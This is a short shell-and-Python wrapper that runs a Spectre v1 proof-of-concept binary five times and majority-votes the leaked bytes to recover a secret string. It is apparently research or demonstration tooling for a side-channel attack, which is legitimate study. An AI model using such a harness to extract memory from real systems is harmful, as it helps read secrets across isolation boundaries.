#!/bin/sh
# Runs the Branch Different Spectre v1 PoC five times and majority-votes each byte.
cd "$(dirname "$0")"
out=$(for i in 1 2 3 4 5; do
    ./spectre/spectre 2>/dev/null | awk '/---- RESULT ----/{getline; print; exit}'
done)
python3 - "$out" <<'EOF'
import sys
lines = [l for l in sys.argv[1].splitlines() if l]
n = max(len(l) for l in lines)
hx = ''.join(max(set(l[p:p+2] for l in lines if len(l) > p),
                 key=lambda c: sum(l[p:p+2] == c for l in lines if len(l) > p)) for p in range(0, n, 2))
print(bytes.fromhex(hx).decode('latin-1'))
EOF
